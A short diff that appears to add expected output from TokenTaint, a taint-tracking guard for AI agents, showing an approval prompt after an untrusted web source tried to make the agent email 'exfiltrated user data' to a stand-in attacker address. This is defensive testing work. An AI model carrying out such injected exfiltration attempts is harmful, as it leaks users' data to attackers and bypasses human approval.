@@ -1,0 +1,6 @@
+⚠️  TokenTaint NEEDS YOUR APPROVAL: send_email
+    An untrusted source (https://evil.example/0) tried to trigger a privileged action.
+    Required trust: TRUSTED
+    Reason: privileged sink 'send_email' justified by 1 untrusted span(s); needs TRUSTED
+    Attempted arguments: {'to': 'attacker@evil.example', 'body': 'exfiltrated user data'}
+    → Approve this action? (y/N)
